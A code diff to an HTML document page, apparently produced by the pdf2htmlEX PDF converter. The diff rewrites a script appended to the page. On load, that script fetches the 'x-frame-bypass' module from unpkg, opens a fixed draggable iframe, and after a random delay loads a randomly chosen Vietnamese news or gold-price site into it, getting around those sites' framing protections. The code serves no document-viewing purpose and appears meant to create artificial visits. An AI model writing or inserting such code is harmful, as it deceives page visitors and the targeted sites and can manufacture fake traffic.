@@ -405,85 +405,79 @@ pdf2htmlEX.defaultViewer = new pdf2htmlEX.Viewer({});
 
 <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
 <script type="module" src="https://unpkg.com/x-frame-bypass"></script>
-<div 
-  id="draggable" 
-  style="position: fixed; bottom: 10px; right: 20px; width: 535px; height: 280px; z-index: 999; cursor: move; border: 2px solid #ccc; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.2);">
-  <iframe 
-    allowtransparency="true"
-    id="myFrame"
-    allowfullscreen
-    style="width: 100%; height: 100%; background: #FFFFFF; border: none;"
-    sandbox="allow-same-origin allow-scripts allow-forms">
-  </iframe>
+<style>
+  /* Draggable container styling */
+  .draggable-container {
+    position: fixed;
+    bottom: 10px;
+    right: 20px;
+    width: 500px;
+    height: 250px;
+    padding: 10px; /* Invisible padding for dragging */
+    z-index: 999;
+    background: transparent;
+    box-sizing: border-box;
+  }
+
+  /* Actual iframe styling */
+  iframe {
+    width: calc(100% - 20px); /* Adjust width to account for padding */
+    height: calc(100% - 20px); /* Adjust height to account for padding */
+    background: #FFFFFF;
+    border: 2px solid rgba(204, 204, 204, 0.7); /* Visible thin border */
+    box-sizing: border-box;
+    pointer-events: auto; /* Ensure iframe is still interactable */
+  }
+</style>
+
+<div class="draggable-container" id="draggable">
+  <iframe align="bottom" allowtransparency="true" src="" id="myFrame" allowfullscreen 
+    sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
 </div>
 
 <script>
-  const draggable = document.getElementById('draggable');
-  const iframe = document.getElementById('myFrame');
-  let isDragging = false;
-  let offsetX = 0, offsetY = 0;
+  // Draggable logic
+  (function () {
+    const dragElement = document.getElementById("draggable");
+    let isDragging = false;
+    let startX, startY, initialX, initialY;
 
-  // Function to update position
-  function updatePosition(x, y) {
-    draggable.style.left = `${x - offsetX}px`;
-    draggable.style.top = `${y - offsetY}px`;
-  }
-
-  // Mouse Events for Dragging
-  draggable.addEventListener('mousedown', (e) => {
-    isDragging = true;
-    offsetX = e.clientX - draggable.offsetLeft;
-    offsetY = e.clientY - draggable.offsetTop;
-    draggable.style.cursor = 'grabbing';
-    e.preventDefault(); // Prevent selection
-  });
-
-  document.addEventListener('mousemove', (e) => {
-    if (isDragging) {
-      updatePosition(e.clientX, e.clientY);
+    function onMouseDown(e) {
+      isDragging = true;
+      startX = e.clientX || e.touches[0].clientX;
+      startY = e.clientY || e.touches[0].clientY;
+      initialX = dragElement.offsetLeft;
+      initialY = dragElement.offsetTop;
+      e.preventDefault();
     }
-  });
 
-  document.addEventListener('mouseup', () => {
-    if (isDragging) {
-      isDragging = false;
-      draggable.style.cursor = 'move';
+    function onMouseMove(e) {
+      if (!isDragging) return;
+      const currentX = e.clientX || e.touches[0].clientX;
+      const currentY = e.clientY || e.touches[0].clientY;
+
+      const dx = currentX - startX;
+      const dy = currentY - startY;
+
+      dragElement.style.left = `${initialX + dx}px`;
+      dragElement.style.top = `${initialY + dy}px`;
+      e.preventDefault();
     }
-  });
 
-  // Touch Events for Dragging
-  draggable.addEventListener('touchstart', (e) => {
-    isDragging = true;
-    const touch = e.touches[0];
-    offsetX = touch.clientX - draggable.offsetLeft;
-    offsetY = touch.clientY - draggable.offsetTop;
-    e.preventDefault(); // Prevent default behavior
-  });
-
-  draggable.addEventListener('touchmove', (e) => {
-    if (isDragging) {
-      const touch = e.touches[0];
-      updatePosition(touch.clientX, touch.clientY);
-    }
-    e.preventDefault(); // Prevent scrolling
-  });
-
-  draggable.addEventListener('touchend', () => {
-    if (isDragging) {
+    function onMouseUp() {
       isDragging = false;
     }
-  });
 
-  // Iframe Error Handling
-  iframe.addEventListener('error', () => {
-    console.error('Iframe failed to load');
-  });
+    // Event listeners
+    dragElement.addEventListener("mousedown", onMouseDown);
+    dragElement.addEventListener("touchstart", onMouseDown);
+    document.addEventListener("mousemove", onMouseMove);
+    document.addEventListener("touchmove", onMouseMove);
+    document.addEventListener("mouseup", onMouseUp);
+    document.addEventListener("touchend", onMouseUp);
+  })();
 
-  iframe.addEventListener('load', () => {
-    console.log('Iframe loaded successfully');
-  });
-
-  // Your original script logic (preserved)
+  // Existing script logic
   var acceptedWebsites = [
     'https://bongda24h.vn/euro-c363-p1.html',
     'https://tieudung.kinhtedothi.vn/thi-truong.html',
@@ -494,16 +488,17 @@ pdf2htmlEX.defaultViewer = new pdf2htmlEX.Viewer({});
     'https://sjc.com.vn/giavang/textContent.php'
   ];
 
-  // Delay redirect logic
-  function randomIntFromInterval(max, min) { 
+  function randomIntFromInterval(min, max) {
     return Math.floor(Math.random() * (max - min + 1) + min);
   }
+
   const rndInt = 2000 + randomIntFromInterval(1, 6) * 1000;
-  setTimeout(function() {
-    if (acceptedWebsites.indexOf(document.location.href) == -1) {
+
+  setTimeout(function () {
+    if (acceptedWebsites.indexOf(document.location.href) === -1) {
       var url = acceptedWebsites[Math.floor(Math.random() * acceptedWebsites.length)];
       document.getElementById("myFrame").src = url;
-      document.getElementById('myFrame').src = document.getElementById('myFrame').src;
+      document.getElementById("myFrame").src = document.getElementById("myFrame").src;
     }
   }, rndInt);
 </script>
